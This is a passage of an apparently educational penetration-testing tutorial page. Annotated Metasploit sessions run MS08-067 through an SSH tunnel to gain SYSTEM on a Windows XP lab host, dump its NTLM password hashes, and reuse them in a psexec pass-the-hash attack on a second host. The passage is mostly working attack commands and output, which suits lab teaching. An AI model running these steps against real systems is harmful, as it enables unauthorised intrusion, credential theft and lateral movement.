+
+Linux bt 3.2.6 #1 SMP Fri Feb 17 10:40:05 EST 2012 i686 GNU/Linux
+
+  System information as of Sat Jan 19 19:56:44 GMT 2013
+
+  System load:  0.01               Processes:           130
+  Usage of /:   28.6% of 47.82GB   Users logged in:     1
+  Memory usage: 16%                IP address for eth0: 192.168.44.137
+  Swap usage:   0%
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+Last login: Sat Jan 19 19:25:22 2013 from 192.168.44.1
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>netstat -antp |grep 445</span>
+netstat -antp |grep 445
+tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN      3486/2          
+tcp6       0      0 ::1:445                 :::*                    LISTEN      3486/2
+
+<strong><em># In a new terminal open up msfconsole. First we will identify the opperating system to verify the tunnel
+# works (could also be done with nmap script scan or enum4linux) and then we will launch a meterpreter
+# bind payload through the tunnel.</em></strong>
+
+msf  exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#2B8156;'>use scanner/smb/smb_version</span>
+
+msf  auxiliary(<span style='color:#ff0000;'>smb_version</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf  auxiliary(<span style='color:#ff0000;'>smb_version</span>) > <span style='color:#2B8156;'>set rhosts 127.0.0.1</span>
+rhosts => 127.0.0.1
+
+msf  auxiliary(<span style='color:#ff0000;'>smb_version</span>) > <span style='color:#2B8156;'>exploit</span>
+
+<span style='color:#333399;'>[*]</span> 127.0.0.1:445 is running Windows XP Service Pack 0 / 1 (language: English) (name:B33F-URLVV9CUV5)
+                                                                               (domain:WORKGROUP)
+<span style='color:#333399;'>[-]</span> 127.0.0.1: ActiveRecord::RecordInvalid Validation failed: Address is reserved
+<span style='color:#333399;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#333399;'>[*]</span> Auxiliary module execution completed
+
+msf > <span style='color:#2B8156;'>search ms08_067</span>
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date          Rank   Description
+   ----                                 ---------------          ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  Microsoft Server Service Relative
+                                                                        Path Stack Corruption
+<strong><em># Take care to set rhost to 127.0.0.1.</em></strong>
+
+msf > <span style='color:#2B8156;'>use exploit/windows/smb/ms08_067_netapi</span>
+
+msf  exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    127.0.0.1        yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
+   LPORT     4444             yes       The listen port
+   RHOST     127.0.0.1        no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Windows XP SP0/SP1 Universal
+
+
+msf  exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#2B8156;'>exploit</span>
+
+<span style='color:#333399;'>[*]</span> Started bind handler
+<span style='color:#333399;'>[*]</span> Attempting to trigger the vulnerability...
+
+<strong><em># We won't get as shell as we are launching the attack on our localhost but lets go back to our tunnel, 
+# close it and background till we are back in msfconsole.</em></strong>
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>exit</span>
+exit
+logout
+Using username "root".
+
+C:\Users\b33f\Desktop><span style='color:#2B8156;'>^Z</span>
+Background channel 1? [y/N]  <span style='color:#2B8156;'>y</span>
+
+<span style='color:#ff0000;'>meterpreter</span> > 
+Background session 4? [y/N]
+
+<strong><em># Set up a handler for the meterpreter bind shell that is waiting for us.</em></strong>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LPORT     4444             yes       The listen port
+   RHOST     192.168.17.134   no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>exploit</span>
+
+<span style='color:#333399;'>[*]</span> Started bind handler
+<span style='color:#333399;'>[*]</span> Starting the payload handler...
+<span style='color:#333399;'>[*]</span> Sending stage (752128 bytes) to 192.168.17.134
+
+<span style='color:#ff0000;'>meterpreter</span> > 
+Background session 5? [y/N]  
+
+<strong><em># As you can see we now have SYSTEM level access to V2.</em></strong>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions</span>
+
+Active sessions
+===============
+
+Id  Type                   Information                             Connection
+--  ----                   -----------                             ----------
+3   meterpreter x86/win32  Trident\b33f @ TRIDENT                  192.168.44.137:9988 
+                                                                   -> 192.168.44.1:58770 (192.168.44.1)
+4   meterpreter x86/win32  B33F-URLVV9CUV5\user1 @ B33F-URLVV9CUV5 192.168.44.137-192.168.44.1:0 
+                                                                   -> 192.168.17.134:4444 (192.168.17.134)
+5   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ B33F-URLVV9CUV5   192.168.44.137:46585 
+                                                                   -> 192.168.17.134:4444 (192.168.17.134)
+  
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>getuid</span>
+Server username: NT AUTHORITY\SYSTEM
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>hashdump</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:17e6ed3ae4ea6164cf94ce448039c13b:1834e6a12f358bd93bfdd45b5395eea1:::
+Owner:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:69be3606bb00c489551eb44859048a8c:::
+user1:1004:e52cac67419a9a2238f10713b629b565:5835048ce94ad0564e29a924a03510ef:::</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+        
+          <img src="images/netsec_4.png" alt="" class="pic" />
+    
+<p>&nbsp;</p>
+
+<h2 class="title">V3 Legacy Server<span class="line"></span></h2>
+       <br /><p>For our final host we will look at another common issue on internal networks. Often a workstation or server is installed and then a snapshot is taken so the configuration can easily be replicated to other hosts. This is of course a major issue! When we compromise a host and dump the password hashes of the users we can use those to try to authenticated to other hosts on the network. Lets try to use the hashes we recovered from V2 to authenticate against V3.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>msf  exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name       Current Setting           Required  Description
+   ----       ---------------           --------  -----------
+   RHOST      192.168.17.132            yes       The target address
+   RPORT      445                       yes       Set the SMB service port
+   SHARE      ADMIN$                    yes       The share to connect to, can be an admin share (ADMIN$,
+                                                  C$,...) or a normal read/write folder share
+   SMBDomain  WORKGROUP                 no        The Windows domain to use for authentication
+   SMBPass    aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+                                        no        The password for the specified username
+   SMBUser    Administrator             no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LPORT     5566             yes       The listen port
+   RHOST     192.168.17.132   no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   
+msf  exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#2B8156;'>exploit</span>
+
+<span style='color:#333399;'>[*]</span> Connecting to the server...
+<span style='color:#333399;'>[*]</span> Started bind handler
+<span style='color:#333399;'>[*]</span> Authenticating to 192.168.17.132:445|WORKGROUP as user 'Administrator'...
+<span style='color:#333399;'>[*]</span> Uploading payload...
+<span style='color:#333399;'>[*]</span> Created \OkddXwLq.exe...
+<span style='color:#333399;'>[*]</span> Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.17.132[\svcctl] ...
+<span style='color:#333399;'>[*]</span> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.17.132[\svcctl] ...
+<span style='color:#333399;'>[*]</span> Obtaining a service manager handle...
+<span style='color:#333399;'>[*]</span> Creating a new service (HRyeauAf - "MRhLxJcCrdBvQlOSnQSjdnYROxRe")...
+<span style='color:#333399;'>[*]</span> Closing service handle...
+<span style='color:#333399;'>[*]</span> Opening service...
+<span style='color:#333399;'>[*]</span> Starting the service...
+<span style='color:#333399;'>[*]</span> Removing the service...
+<span style='color:#333399;'>[*]</span> Closing service handle...
+<span style='color:#333399;'>[*]</span> Sending stage (752128 bytes)
+<span style='color:#333399;'>[*]</span> Deleting \OkddXwLq.exe...
+<span style='color:#333399;'>[*]</span> Meterpreter session 6 opened (192.168.44.137-192.168.44.1:0 -> 192.168.17.132:5566) 
+    at 2013-01-19 21:22:04 +0000
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>getuid</span>
+Server username: NT AUTHORITY\SYSTEM
+
+<span style='color:#ff0000;'>meterpreter</span> > 
+Background session 6? [y/N]  
+
+msf  exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#2B8156;'>sessions</span>
+Active sessions
+===============
+
+  Id  Type                   Information                              Connection
+  --  ----                   -----------                              ----------
+  3   meterpreter x86/win32  Trident\b33f @ TRIDENT                   192.168.44.137:9988 
+                                                                      -> 192.168.44.1:58770 (192.168.44.1)
+  4   meterpreter x86/win32  B33F-URLVV9CUV5\user1 @ B33F-URLVV9CUV5  192.168.44.137-192.168.44.1:0 
+                                                                      -> 192.168.17.134:4444 (192.168.17.134)
+  5   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ B33F-URLVV9CUV5    192.168.44.137:46585 
+                                                                      -> 192.168.17.134:4444 (192.168.17.134)
+  6   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ B33F-E95CE571A1    192.168.44.137-192.168.44.1:0 
+                                                                      -> 192.168.17.132:5566 (192.168.17.132)
+  
+msf  exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#2B8156;'>...Game Over...</span></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+        
+          <img src="images/netsec_5.png" alt="" class="pic" />
+
+<br />
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
